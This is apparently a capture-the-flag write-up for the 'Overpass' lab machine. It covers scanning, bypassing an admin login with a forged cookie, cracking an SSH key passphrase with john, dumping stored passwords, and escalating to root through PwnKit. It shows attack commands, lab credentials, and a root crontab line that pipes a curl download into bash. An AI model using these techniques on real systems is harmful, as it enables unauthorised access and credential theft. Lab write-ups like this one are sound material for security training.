# Overpass
What happens when some broke CompSci students make a password manager?

---

What happens when a group of broke Computer Science students try to make a password manager?\
Obviously a perfect commercial success!

The machine was slightly modified on 2020/09/25. This was only to improve the performance of the machine. It does not affect the process.

---

Given the IP address of the target machine, we launch first our scan.
```
$ sudo nmap -sV $target_ip -Pn -n -p-

<...snip...>
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The Go-powered HTTP server serves the website of the company Overpass. From there we can download executables of the password manager as well as the source code.\
The team uses rot47 as the cryptography scheme, which is very weak, and anyone who can access the encryption file called `.overpass` can decrypt all the contained passwords.

Enumerating the website directories, we find the admin login page. One might try to brute force some login credentials, but the challenge hints at an OWASP vulnerability so there should be a better way.

Inspecting the source code we have at `/admin` we find several scripts being referenced, which we can check out.\
The most interesting one is `login.js` which implements the logic of the login procedure. It's in this script where the flaw resides. Cookies management is broken (OWASP broken access control) and we can add our own cookie with any random value and will get accepted and give us a session as an admin.

```
$ curl http://<target_ip>/admin/ --cookie "SessionToken=whatever"

<...snip...>
        <div>
            <p>Since you keep forgetting your password, James, I've set up SSH keys for you.</p>
            <p>If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.<br>
                Also, we really need to talk about this "Military Grade" encryption. - Paradox</p>
            <pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
<...snip...>
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----</pre>
        </div>
    </div>
</body>
```

Very juicy information. We got an RSA private key as well as the corresponding username James. Now we can try connecting via SSH.\
Let `id_rsa` be the file containing the private key. If we try ssh to the target machine, we'll be prompted to enter a passphrase:

```
$ ssh james@<target_ip> -i id_rsa

Enter passphrase for key 'id_rsa': 
```

Let's use `john` to crack this passphrase. First, we extract the passphrase's hash, and then we launch the attack:
```
$ ssh2john id_rsa > hash

$ john hash -wordlist:/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)

```

Sweet, now we can connect. The user flag is in James' home directory.\
That directory contains another note, named `todo.txt`:
```
james@overpass-prod:~$ cat todo.txt
 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

James uses Overpass, thus, the `.overpass` file is in his home directory.
Having this file, we can use Overpass (downloadable from the website) to access James' passwords (maybe we can use them later):
```
james@overpass-prod:~$ ./overpassLinux       
                                                         
Welcome to Overpass
Options:
1       Retrieve Password For Service
2       Set or Update Password For Service
3       Delete Password For Service
4       Retrieve All Passwords
5       Exit
Choose an option:       4
System   saydrawnlyingpicture
```

While exploring the machine for possible privilege escalation opportunities,
I came across the below crontab file and thought maybe we could manipulate
`buildscript.sh` to obtain a root shell. Unfortunately, I couldn't find that file
on the machine (looks like the web app is hosted on a virtual environment different from `overpass-prod`).
```
james@overpass-prod:~$ cat  /etc/crontab

<...snip...>
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Without any further enumeration, we use the `linPEAS.sh` to give us quick results.
```
james@overpass-prod:~$ ./linPEAS.sh

<...snip...>
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                            
[+] [CVE-2021-4034] PwnKit                                                                    

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

```

Check out [this GitHub repo](https://github.com/berdav/CVE-2021-4034) for a good exploitation script.

Once executed, we have access to a root shell. Hence, the root flag.
